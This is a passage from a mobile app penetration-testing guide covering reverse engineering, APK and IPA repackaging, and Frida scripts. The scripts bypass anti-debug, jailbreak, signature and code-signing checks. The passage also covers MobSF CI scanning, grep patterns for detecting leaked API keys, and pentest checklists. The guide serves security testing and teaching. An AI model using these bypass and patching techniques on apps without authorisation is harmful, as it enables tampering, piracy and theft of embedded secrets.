# Tools: kotlinx-metadata-jvm for parsing
```

**iOS (Objective-C / Swift):**
```bash
# Objective-C: Relatively easy (runtime metadata preserved)
# class-dump extracts full header files
class-dump -H App.app/App -o headers/

# Swift: Harder (names may be mangled, types complex)
# Hopper: "Swift demangle" option
# IDA Pro: Swift demangler plugin

# Swift metadata parsing:
swift-demangle < mangled_names.txt

# For full decompilation: Ghidra (free) with Swift extensions
# Or Hopper Disassembler (pseudo-code generation for ARM64)
```

### 9.2 Understanding Obfuscation

**ProGuard / R8 (Android):**
```bash
# ProGuard shrinks, optimizes, and obfuscates Java bytecode
# Effects:
# - Class/method/field renaming (a.b.c, a(), b())
# - Unused code removal (tree shaking)
# - Method inlining
# - String encryption (with additional tools like DexGuard)

# Finding mapping file (if leaked):
find . -name "mapping.txt" -o -name "proguard-mapping.txt"
# mapping.txt translates obfuscated → original names

# Deobfuscation with retrace:
retrace mapping.txt stacktrace.txt

# DexGuard (commercial, stronger):
# - String encryption
# - Resource encryption
# - Native library protection
# - Certificate pinning enforcement
# - Root/emulator/debugger detection
# - RASP (Runtime Application Self-Protection)
```

**Swift Obfuscation:**
```bash
# Swift preserves less metadata than ObjC by default
# Additional obfuscation tools:
# - SwiftShield (open source: renames classes/methods)
# - iXGuard (commercial: control flow, string encryption)

# Indicators of obfuscation:
# - Meaningless class names in headers
# - XOR-encoded strings
# - Opaque predicates (dead code branches)
# - Control flow flattening (switch-based dispatch)
```

### 9.3 Patching and Repackaging

**Android APK Patching Workflow:**
```bash
# 1. Decode
apktool d target.apk -o patched/

# 2. Modify (examples)
# Disable root detection:
find patched/smali -name "*.smali" | xargs grep -l "isRooted\|isDeviceRooted"
# Edit the Smali to return false (see Section 3.1)

# Remove SSL pinning from network_security_config.xml
# Add user trust anchors (see Section 3.4)

# Enable debug mode:
# In AndroidManifest.xml: android:debuggable="true"

# 3. Rebuild
apktool b patched/ -o patched.apk

# 4. Zipalign
zipalign -v 4 patched.apk aligned.apk

# 5. Sign
apksigner sign --ks debug.keystore --ks-pass pass:android aligned.apk
# Note: signature differs from original — signature-check-based protections will trigger

# 6. Install
adb install aligned.apk
```

**iOS IPA Patching (requires Mac):**
```bash
# 1. Unzip IPA
unzip App.ipa -d patched/

# 2. Modify binary (e.g., patch jailbreak detection)
# Use Hopper to find function address
# Binary patch with hex editor (change branch instruction)
# Or inject Frida gadget:
cp FridaGadget.dylib patched/Payload/App.app/Frameworks/
# Add load command:
insert_dylib @executable_path/Frameworks/FridaGadget.dylib patched/Payload/App.app/App --inplace

# 3. Remove old signature
rm -rf patched/Payload/App.app/_CodeSignature

# 4. Re-sign with your provisioning profile
codesign -f -s "iPhone Developer: ..." --entitlements entitlements.plist patched/Payload/App.app

# 5. Repackage
cd patched && zip -r ../patched.ipa Payload/

# 6. Install via sideload (Xcode, ideviceinstaller, AltStore)
ideviceinstaller -i patched.ipa
```

### 9.4 Hooking at Runtime with Frida

**Advanced Frida Techniques:**

```javascript
// Hook native function (C/C++ in .so library)
var nativeFunc = Module.findExportByName("libnative.so", "Java_com_example_NativeLib_verify");
Interceptor.attach(nativeFunc, {
    onEnter: function(args) {
        // JNIEnv*, jobject, jstring (the input to verify)
        var env = args[0];
        var input = args[2];
        
        // Read JNI string
        var JNI = Java.vm.getEnv();
        var inputStr = JNI.getStringUtfChars(input, null).readCString();
        console.log("[native] verify(" + inputStr + ")");
    },
    onLeave: function(retval) {
        console.log("[native] verify returned: " + retval.toInt32());
        // Force return true
        retval.replace(1);
    }
});

// Enumerate exports of a native library
Module.enumerateExports("libnative.so", {
    onMatch: function(exp) {
        if (exp.type === "function") {
            console.log(exp.name + " @ " + exp.address);
        }
    },
    onComplete: function() {}
});

// Hook all JNI calls from a specific library
var libname = "libnative.so";
var baseAddr = Module.findBaseAddress(libname);
console.log(libname + " base: " + baseAddr);

// Read memory at offset (useful for finding embedded secrets)
var secret = baseAddr.add(0x1234).readCString();
console.log("Embedded string: " + secret);
```

**Frida Stalker (Code Tracing):**
```javascript
// Trace all instructions in a function
var targetAddr = Module.findExportByName("libnative.so", "decryptPayload");

Stalker.follow(Process.getCurrentThreadId(), {
    events: { call: true, ret: true },
    onReceive: function(events) {
        var parsed = Stalker.parse(events);
        parsed.forEach(function(event) {
            console.log(event[0] + ": " + event[1] + " -> " + event[2]);
        });
    }
});

// Call the function to trace its execution
var decrypt = new NativeFunction(targetAddr, 'pointer', ['pointer', 'int']);
decrypt(Memory.allocUtf8String("test"), 4);

Stalker.unfollow(Process.getCurrentThreadId());
```

### 9.5 Analyzing Native Libraries

**Android .so (Shared Object) files:**
```bash
# List native libraries in APK
unzip -l target.apk | grep "lib/"
# lib/arm64-v8a/libnative.so
# lib/armeabi-v7a/libnative.so

# Extract and analyze
unzip target.apk lib/arm64-v8a/libnative.so
# Use Ghidra, IDA Pro, or radare2:
r2 -A lib/arm64-v8a/libnative.so

# List exported functions
r2 -qc "afl" lib/arm64-v8a/libnative.so | grep -i "java_\|encrypt\|decrypt\|verify\|sign"

# Find strings (hardcoded keys, URLs)
r2 -qc "iz" lib/arm64-v8a/libnative.so | grep -i "key\|secret\|http\|api"
```

**iOS .dylib and Frameworks:**
```bash
# List frameworks in IPA
ls Payload/App.app/Frameworks/

# Analyze Mach-O binary with nm
nm -gU App | grep -i "encrypt\|decrypt\|verify"

# Disassemble specific function with objdump
objdump -d --start-address=0x100001234 --stop-address=0x100001300 App

# Use Ghidra for full decompilation of ARM64 code
# Import Mach-O, auto-analyze, navigate to functions of interest
```

### 9.6 ARM64 Assembly Basics for Mobile RE

Key instructions encountered during mobile reverse engineering:

```asm
; Function prologue (frame setup)
stp x29, x30, [sp, #-16]!   ; Save frame pointer and link register
mov x29, sp                   ; Set up frame pointer

; Function call
bl _objc_msgSend              ; Branch with Link (call)
blr x8                        ; Branch with Link to Register (indirect call)

; Return
ldp x29, x30, [sp], #16      ; Restore frame pointer and link register
ret                           ; Return (branch to LR / x30)

; Conditional branch
cbz x0, label                 ; Compare and Branch if Zero
cbnz x0, label                ; Compare and Branch if Not Zero
b.eq label                    ; Branch if equal (after cmp)
b.ne label                    ; Branch if not equal

; Common patterns in security code:
; Compare return value and branch
bl _isJailbroken              ; Call jailbreak check
cbz x0, .Lnot_jailbroken     ; If returned 0, skip restriction
; ... restriction code ...
.Lnot_jailbroken:

; To bypass: patch 'cbz' to unconditional 'b' (always skip restriction)
; Or: patch _isJailbroken to always return 0 (mov x0, #0; ret)

; PAC instructions (A12+):
paciasp                       ; Sign LR with A-key (in prologue)
autiasp                       ; Authenticate LR with A-key (before ret)
; If PAC fails, pointer becomes invalid → crash on ret
```

### 9.7 Anti-Tampering and Anti-Debug Bypass

**Android Anti-Debug:**
```javascript
// Frida: Bypass common anti-debug techniques

Java.perform(function() {
    // 1. Bypass Debug.isDebuggerConnected()
    var Debug = Java.use("android.os.Debug");
    Debug.isDebuggerConnected.implementation = function() {
        console.log("[*] isDebuggerConnected() → false");
        return false;
    };

    // 2. Bypass TracerPid check
    // Apps read /proc/self/status to check TracerPid
    var FileInputStream = Java.use("java.io.FileInputStream");
    // Hook at lower level to intercept /proc/self/status reads
});

// Native level: bypass ptrace(PTRACE_TRACEME)
var ptrace = Module.findExportByName(null, "ptrace");
Interceptor.attach(ptrace, {
    onEnter: function(args) {
        if (args[0].toInt32() === 0) { // PTRACE_TRACEME
            console.log("[*] ptrace(PTRACE_TRACEME) blocked");
            this.shouldBlock = true;
        }
    },
    onLeave: function(retval) {
        if (this.shouldBlock) {
            retval.replace(0); // Return success
        }
    }
});

// Bypass timer-based anti-debug (detect slow execution)
var System = Java.use("java.lang.System");
var realTime = System.currentTimeMillis();
System.currentTimeMillis.implementation = function() {
    // Return accelerated time to pass timing checks
    realTime += 1; // Only advance 1ms per call
    return realTime;
};
```

**iOS Anti-Debug:**
```javascript
// Bypass ptrace(PT_DENY_ATTACH) on iOS
var ptrace = Module.findExportByName(null, "ptrace");
Interceptor.attach(ptrace, {
    onEnter: function(args) {
        if (args[0].toInt32() === 31) { // PT_DENY_ATTACH
            console.log("[*] PT_DENY_ATTACH intercepted");
            args[0] = ptr(0); // Change to PT_TRACE_ME (harmless)
        }
    }
});

// Bypass sysctl-based debugger detection
var sysctl = Module.findExportByName(null, "sysctl");
Interceptor.attach(sysctl, {
    onEnter: function(args) {
        // CTL_KERN, KERN_PROC, KERN_PROC_PID
        var mib = args[0];
        if (mib.readU32() === 1 && mib.add(4).readU32() === 14) {
            this.isDebugCheck = true;
            this.infoPtr = args[2];
        }
    },
    onLeave: function(retval) {
        if (this.isDebugCheck) {
            // Clear P_TRACED flag in kinfo_proc.kp_proc.p_flag
            var flagOffset = 32; // Offset varies by struct version
            var flags = this.infoPtr.add(flagOffset).readU32();
            flags &= ~0x800; // Clear P_TRACED
            this.infoPtr.add(flagOffset).writeU32(flags);
            console.log("[*] Cleared P_TRACED flag");
        }
    }
});

// Bypass getppid() check (debugged apps have ppid != launchd)
Interceptor.attach(Module.findExportByName(null, "getppid"), {
    onLeave: function(retval) {
        retval.replace(1); // Return 1 (launchd PID)
    }
});
```

**Integrity Checks Bypass:**
```javascript
// Apps may check their own signature/hash at runtime
// Android: verify APK signature
Java.perform(function() {
    var PackageManager = Java.use("android.app.ApplicationPackageManager");
    PackageManager.getPackageInfo.overload('java.lang.String', 'int').implementation = function(pkg, flags) {
        var info = this.getPackageInfo(pkg, flags);
        if (flags === 64) { // GET_SIGNATURES
            // Replace with original signature
            console.log("[*] Spoofing package signature");
            // Would need original signature bytes
        }
        return info;
    };
});

// iOS: Code signing check bypass
// Hook SecCodeCheckValidityWithErrors
var SecCode = Module.findExportByName("Security", "SecCodeCheckValidityWithErrors");
if (SecCode) {
    Interceptor.attach(SecCode, {
        onLeave: function(retval) {
            retval.replace(0); // errSecSuccess
        }
    });
}
```

---

## 10. Automation and CI/CD Security

### 10.1 MobSF Automated Analysis

**MobSF Docker Configuration:**
```yaml
# docker-compose.yml for MobSF
version: '3'
services:
  mobsf:
    image: opensecurity/mobile-security-framework-mobsf:latest
    ports:
      - "8000:8000"
    volumes:
      - ./uploads:/home/mobsf/uploads
      - ./downloads:/home/mobsf/downloads
    environment:
      - MOBSF_API_KEY=your_secure_api_key_here
    restart: unless-stopped
```

**MobSF REST API Integration:**
```bash
# Upload APK/IPA for analysis
HASH=$(curl -s -F "file=@app.apk" \
  http://localhost:8000/api/v1/upload \
  -H "Authorization: your_secure_api_key_here" | jq -r '.hash')

# Trigger scan
curl -s -X POST http://localhost:8000/api/v1/scan \
  -H "Authorization: your_secure_api_key_here" \
  -d "scan_type=apk&file_name=app.apk&hash=${HASH}"

# Get JSON report
curl -s -X POST http://localhost:8000/api/v1/report_json \
  -H "Authorization: your_secure_api_key_here" \
  -d "hash=${HASH}" > report.json

# Get PDF report
curl -s -X POST http://localhost:8000/api/v1/download_pdf \
  -H "Authorization: your_secure_api_key_here" \
  -d "hash=${HASH}" -o report.pdf

# Scorecard (pass/fail for CI/CD)
curl -s -X POST http://localhost:8000/api/v1/scorecard \
  -H "Authorization: your_secure_api_key_here" \
  -d "hash=${HASH}" | jq '.security_score'
```

**CI/CD Pipeline Integration (GitHub Actions example):**
```yaml
# .github/workflows/mobile-security.yml
name: Mobile Security Scan
on:
  pull_request:
    paths:
      - 'android/**'
      - 'ios/**'

jobs:
  mobsf-scan:
    runs-on: ubuntu-latest
    services:
      mobsf:
        image: opensecurity/mobile-security-framework-mobsf:latest
        ports:
          - 8000:8000
        env:
          MOBSF_API_KEY: ${{ secrets.MOBSF_API_KEY }}
    steps:
      - uses: actions/checkout@v4
      
      - name: Build APK
        run: ./gradlew assembleRelease
      
      - name: Upload to MobSF
        id: upload
        run: |
          HASH=$(curl -s -F "file=@app/build/outputs/apk/release/app-release.apk" \
            http://localhost:8000/api/v1/upload \
            -H "Authorization: ${{ secrets.MOBSF_API_KEY }}" | jq -r '.hash')
          echo "hash=$HASH" >> $GITHUB_OUTPUT
      
      - name: Run Scan
        run: |
          curl -s -X POST http://localhost:8000/api/v1/scan \
            -H "Authorization: ${{ secrets.MOBSF_API_KEY }}" \
            -d "scan_type=apk&file_name=app-release.apk&hash=${{ steps.upload.outputs.hash }}"
      
      - name: Check Security Score
        run: |
          SCORE=$(curl -s -X POST http://localhost:8000/api/v1/scorecard \
            -H "Authorization: ${{ secrets.MOBSF_API_KEY }}" \
            -d "hash=${{ steps.upload.outputs.hash }}" | jq '.security_score')
          echo "Security Score: $SCORE"
          if [ $(echo "$SCORE < 60" | bc) -eq 1 ]; then
            echo "SECURITY SCORE BELOW THRESHOLD (60)"
            exit 1
          fi
```

### 10.2 MAST — Mobile Application Security Testing in Pipeline

**MAST Framework Integration:**

```bash
# SAST (Static Application Security Testing)
# Tools: MobSF, QARK, AndroBugs, Semgrep (mobile rules)

# Semgrep for mobile-specific vulnerabilities
semgrep --config "p/android" --config "p/swift" ./app/src/

# QARK (Quick Android Review Kit)
qark --apk target.apk --report-type json --report-dir ./reports/

# DAST (Dynamic Application Security Testing)
# Requires running emulator/device — see Section 10.3

# IAST (Interactive — instrument running app)
# Commercial: Checkmarx CxIAST, Contrast Security, Synopsys Seeker
# Open source: Frida-based custom instrumentation
```

**Quality Gate Configuration:**
```json
{
  "quality_gate": {
    "block_on": {
      "critical_findings": 0,
      "high_findings": 3,
      "security_score_minimum": 60
    },
    "warn_on": {
      "medium_findings": 10,
      "outdated_dependencies": 5
    },
    "checks": [
      "no_hardcoded_secrets",
      "ssl_pinning_present",
      "root_detection_present",
      "debuggable_false",
      "minSdkVersion_gte_24",
      "network_security_config_present",
      "backup_disabled",
      "exported_components_protected"
    ]
  }
}
```

### 10.3 DAST for Mobile APIs

```bash
# Mobile API testing differs from web DAST:
# 1. API endpoints often documented in binary (grep for URLs)
# 2. Authentication tokens obtained differently (device attestation, biometric)
# 3. Custom headers (X-Device-ID, X-App-Version, X-Platform)
# 4. Certificate pinning must be bypassed first

# Automated API fuzzing with nuclei:
nuclei -l mobile_api_endpoints.txt -t mobile-api/ -H "Authorization: Bearer $TOKEN"

# OWASP ZAP for mobile API:
zap-cli active-scan --scanners all -t https://api.example.com/v1/
# Configure ZAP with:
# - Mobile User-Agent string
# - Authentication token (pre-obtained)
# - Custom headers the API expects

# Postman/Newman for automated API testing:
newman run mobile_api_collection.json \
  --environment production.json \
  --reporters cli,json \
  --reporter-json-export results.json
```

### 10.4 Dependency Scanning for Mobile

**Android (Gradle dependencies):**
```bash
# Snyk for Gradle
snyk test --file=app/build.gradle --package-manager=gradle

# OWASP Dependency-Check
dependency-check --project "MobileApp" --scan app/build.gradle \
  --format JSON --out ./reports/

# Gradle plugin (built-in):
# build.gradle.kts
# plugins { id("org.owasp.dependencycheck") version "9.0.0" }
./gradlew dependencyCheckAnalyze

# Renovate/Dependabot for automated updates:
# .github/dependabot.yml
# - package-ecosystem: "gradle"
#   directory: "/android"
#   schedule: { interval: "weekly" }
```

**iOS (CocoaPods / SPM):**
```bash
# Snyk for CocoaPods
snyk test --file=ios/Podfile.lock

# For Swift Package Manager
snyk test --file=Package.resolved

# pod-audit (Ruby gem)
gem install cocoapods-audit
cd ios && pod audit

# License compliance check
license_finder --project-path=./ios
```

**React Native / Flutter (cross-platform):**
```bash
# React Native: npm/yarn audit
cd mobile_app && npm audit --json > audit_results.json

# Flutter: pub outdated + license check
cd flutter_app && dart pub outdated
dart pub deps --json | jq '.packages[].name'

# Snyk for all:
snyk test --all-projects --detection-depth=4
```

### 10.5 Secrets Detection in Mobile Apps

**Static Secret Detection:**
```bash
# grep for common patterns in decompiled source
grep -rn "AKIA[0-9A-Z]\{16\}" output/          # AWS Access Key
grep -rn "AIza[0-9A-Za-z_-]\{35\}" output/     # Google API Key
grep -rn "sk_live_[0-9a-zA-Z]\{24\}" output/   # Stripe Secret Key
grep -rn "ghp_[0-9a-zA-Z]\{36\}" output/       # GitHub PAT
grep -rn "xox[bpras]-[0-9a-zA-Z-]\+" output/   # Slack Token

# TruffleHog (binary scanning)
trufflehog filesystem --directory=./decompiled_app --json > secrets.json

# Gitleaks (if source in git)
gitleaks detect --source=. --report-path=gitleaks-report.json

# Mobile-specific: search for Firebase config
grep -rn "google-services.json\|GoogleService-Info.plist" .
# These contain API keys — check if restricted in Google Cloud Console

# Check for hardcoded crypto keys
grep -rn "AES\|DES\|RSA\|HMAC" output/ | grep -i "key\|secret\|iv\|nonce"
# Look for Base64-encoded 16/24/32 byte strings near crypto code
```

**Binary Secret Detection:**
```bash
# strings command on native libraries
strings -n 12 lib/arm64-v8a/libnative.so | grep -i "key\|secret\|token\|pass\|api"

# For iOS:
strings App.app/App | grep -i "key\|secret\|token\|pass\|api"

# Entropy analysis (find high-entropy strings that may be keys)
# Custom script to find base64/hex strings with high entropy:
python3 -c "
import math, re, sys

def entropy(s):
    prob = [float(s.count(c)) / len(s) for c in dict.fromkeys(list(s))]
    return -sum([p * math.log2(p) for p in prob])

with open(sys.argv[1], 'rb') as f:
    content = f.read().decode('utf-8', errors='ignore')
    
for match in re.finditer(r'[A-Za-z0-9+/=_-]{20,}', content):
    s = match.group()
    e = entropy(s)
    if e > 4.5:  # High entropy threshold
        print(f'[ENTROPY {e:.2f}] {s[:80]}')
" decompiled_binary.txt
```

### 10.6 Publishing Security — App Store Review Process

**Google Play Store:**
```bash
# Pre-submission checklist:
# 1. Remove debuggable flag: android:debuggable="false"
# 2. Remove logging in release build (ProGuard rules):
#    -assumenosideeffects class android.util.Log { *; }
# 3. Enable ProGuard/R8 obfuscation
# 4. Verify signing key is production (not debug)
# 5. Check for test/staging endpoints in binary
# 6. Ensure network_security_config restricts cleartext

# Google Play App Signing:
# - Upload key: developer holds
# - App signing key: Google holds (Play App Signing)
# - Key rotation possible (but old devices cannot verify updates)

# Data Safety section:
# - Must accurately declare data collection
# - Lie → removal from Play Store
# - Automated + manual review checks declarations against behavior
```

**Apple App Store:**
```bash
# Pre-submission checklist:
# 1. ATS exceptions justified (Apple may reject broad exceptions)
# 2. Privacy manifest (PrivacyInfo.xcprivacy) required since iOS 17
# 3. No private API usage (checked by automated review)
# 4. Entitlements match provisioning profile
# 5. No test/beta APIs in production binary
# 6. Crash-free (Apple reviews crash rate)

# Privacy Manifest requirements:
# - Declare required reason APIs (UserDefaults, file timestamp, etc.)
# - Declare tracking domains
# - Third-party SDKs must include their own privacy manifests

# App Review Guidelines enforcement:
# - 2.1: App completeness (crashes = rejection)
# - 2.3: Accurate metadata (screenshots, description)
# - 3.0: Business (no hidden fees)
# - 4.0: Design (HIG compliance)
# - 5.0: Legal (privacy policy required)
# - 5.1.1: Data collection + use disclosure
# - 5.1.2: Data use and sharing
```

**Signing Key Security:**
```bash
# Critical: signing key compromise = game over
# Attacker can publish malicious updates to all users

# Android:
# - Store keystore in HSM or cloud KMS
# - Use Play App Signing (Google holds app signing key)
# - Rotate upload key if compromised (Play Console)
# - CI/CD: inject keystore via secrets, never commit to repo

# iOS:
# - Certificates managed via Apple Developer Portal
# - Provisioning profiles expire annually
# - Code signing in CI: Fastlane match (encrypted, git-stored)
# - Never store .p12 files unencrypted
# - Revoke certificates immediately if compromised
```

---

## Appendix A: Mobile Pentest Methodology Checklist

### Phase 1: Reconnaissance
- [ ] Identify app version, build number, target SDK
- [ ] Download APK/IPA from official store
- [ ] Identify third-party SDKs and libraries
- [ ] Map API endpoints (from binary analysis + proxy)
- [ ] Identify authentication mechanism
- [ ] Review app permissions

### Phase 2: Static Analysis
- [ ] Decompile binary (jadx/class-dump/Hopper)
- [ ] Search for hardcoded secrets and API keys
- [ ] Review AndroidManifest.xml / Info.plist
- [ ] Check exported components (providers, receivers, activities)
- [ ] Analyze network security configuration
- [ ] Review certificate pinning implementation
- [ ] Check obfuscation level
- [ ] Review native library security

### Phase 3: Dynamic Analysis
- [ ] Set up proxy (Burp/mitmproxy)
- [ ] Bypass SSL pinning
- [ ] Bypass root/jailbreak detection
- [ ] Hook security-critical functions (Frida)
- [ ] Test authentication flows
- [ ] Test session management
- [ ] Analyze IPC mechanisms
- [ ] Test deep link handling
- [ ] Test WebView security

### Phase 4: Data Storage
- [ ] Analyze local databases (SQLite, Realm)
- [ ] Check SharedPreferences / NSUserDefaults
- [ ] Review Keystore / Keychain usage
- [ ] Check backup content
- [ ] Monitor clipboard usage
- [ ] Check for sensitive logging
- [ ] Verify screenshot protection
- [ ] Check keyboard cache

### Phase 5: Network
- [ ] Verify TLS configuration (version, ciphers)
- [ ] Test certificate pinning robustness
- [ ] Check for cleartext traffic
- [ ] Analyze non-HTTP protocols
- [ ] Test API authorization (BOLA/IDOR)
- [ ] Check API rate limiting
- [ ] Test push notification security

### Phase 6: Binary Protection
- [ ] Verify anti-tampering mechanisms
- [ ] Test anti-debug protections
- [ ] Assess obfuscation effectiveness
- [ ] Check for emulator detection
- [ ] Test integrity verification
- [ ] Verify root/jailbreak detection depth

---

## Appendix B: Tool Reference

| Tool | Platform | Purpose | License |
|------|----------|---------|---------|
| jadx | Android | Decompilation (DEX → Java) | Apache 2.0 |
| apktool | Android | Resource decoding + Smali | Apache 2.0 |
| Frida | Both | Dynamic instrumentation | wxWindows |
| objection | Both | Frida wrapper (pre-built scripts) | MIT |
| MobSF | Both | Automated static+dynamic analysis | GPL 3.0 |
| Burp Suite | Both | HTTP/S proxy and scanner | Commercial (Community free) |
| mitmproxy | Both | Transparent HTTP/S proxy | MIT |
| Hopper | iOS/macOS | Disassembler + decompiler | Commercial |
| IDA Pro | Both | Disassembler (industry standard) | Commercial |
| Ghidra | Both | Disassembler + decompiler | Apache 2.0 (NSA) |
| class-dump | iOS | ObjC header extraction | MIT |
| Cycript | iOS | Runtime exploration | GPL |
| keychain-dumper | iOS | Keychain extraction | MIT |
| radare2/rizin | Both | Reverse engineering framework | LGPL/GPL |
| drozer | Android | Security assessment | BSD |
| QARK | Android | Static analysis | Apache 2.0 |
| nuclei | Both | API vulnerability scanner | MIT |
| Semgrep | Both | Pattern-based SAST | LGPL 2.1 |
| TruffleHog | Both | Secret detection | AGPL 3.0 |
| Gitleaks | Both | Git secret scanning | MIT |

---

## Appendix C: Common Vulnerability → Tool Mapping

| Vulnerability | Detection Method | Primary Tool |
|---------------|-----------------|--------------|
| Hardcoded secrets | Static analysis | jadx + grep / TruffleHog |
| Insecure storage | File system analysis | adb shell / objection |
| SSL pinning absence | Network interception | Burp (no bypass needed = no pinning) |
| Exported components | Manifest analysis | MobSF / apktool |
| WebView XSS | Dynamic + hook | Frida / Burp |
| Root detection absence | Static check | jadx (search for check functions) |
| Weak crypto | Static analysis | MobSF / Semgrep |
| Debug enabled | Manifest check | `android:debuggable="true"` |
| Backup enabled | Manifest check | `android:allowBackup="true"` |
| Biometric bypass | Runtime hooking | Frida (callback manipulation) |
| Token leakage | Logging analysis | logcat / Console.app |
| BOLA/IDOR | API testing | Burp + auth token swap |
| Deep link abuse | Intent fuzzing | adb am start / Frida |
| Clipboard sniffing | Runtime monitoring | Frida clipboard hooks |

---

## Appendix D: Reporting Template (Executive + Technical)

**Finding Structure:**

```
## [SEVERITY] Finding Title

**CVSS:** 7.5 (High) — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)
**OWASP Mobile:** M9 (Insecure Data Storage)

### Description
[Concise description of the vulnerability]

### Impact
[What an attacker gains: data theft, account takeover, etc.]

### Reproduction Steps
1. Install app version X.Y.Z on rooted device
2. Execute: adb shell cat /data/data/com.example.app/shared_prefs/auth.xml
3. Observe plaintext access_token in file

### Evidence
[Screenshot, logcat output, Frida console output]

### Remediation
- Store tokens in Android Keystore (hardware-backed)
- Set `android:allowBackup="false"` in Manifest
- Implement EncryptedSharedPreferences (Jetpack Security)

### References
- https://owasp.org/www-project-mobile-top-10/
- https://developer.android.com/topic/security/data
```

---

## References

1. OWASP Mobile Application Security (MAS) — https://mas.owasp.org/
2. OWASP Mobile Application Security Testing Guide (MASTG) — https://mas.owasp.org/MASTG/
3. OWASP Mobile Application Security Verification Standard (MASVS) — https://mas.owasp.org/MASVS/
4. Android Security Documentation — https://source.android.com/docs/security
5. Apple Platform Security Guide — https://support.apple.com/guide/security/
6. Frida Documentation — https://frida.re/docs/
7. MobSF Documentation — https://mobsf.github.io/docs/
8. NIST SP 800-163r1: Vetting the Security of Mobile Applications — https://csrc.nist.gov/pubs/sp/800/163/r1/final
9. ENISA: Smartphone Secure Development Guidelines — https://www.enisa.europa.eu/publications/smartphone-secure-development-guidelines
10. Android Keystore System — https://developer.android.com/training/articles/keystore
11. iOS Security Research Device Program — https://security.apple.com/research/
12. RFC 7636: Proof Key for Code Exchange (PKCE) — https://datatracker.ietf.org/doc/html/rfc7636
